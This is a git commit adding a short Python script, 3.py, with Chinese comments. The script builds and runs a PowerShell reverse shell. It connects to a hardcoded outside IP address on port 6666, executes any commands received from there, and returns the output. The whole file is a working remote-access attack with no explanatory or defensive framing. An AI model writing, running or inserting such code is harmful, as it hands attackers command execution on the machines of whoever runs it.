e656390f084565f8dd223a308ea409c1b99145cf
Chih <wzhi2013@gmail.com>
2024-05-27 13:09:43 +0800

    Add files via upload

---
+++ 3.py
@@ -0,0 +1,11 @@
+import os
+
+# 替换为你的目标 IP 地址和端口号
+target_ip = "24.199.68.150"
+target_port = 6666
+
+# 构造命令字符串
+command = f"cmd /c powershell -c \"$client = New-Object System.Net.Sockets.TcpClient('{target_ip}',{target_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\""
+
+# 执行命令
+os.system(command)
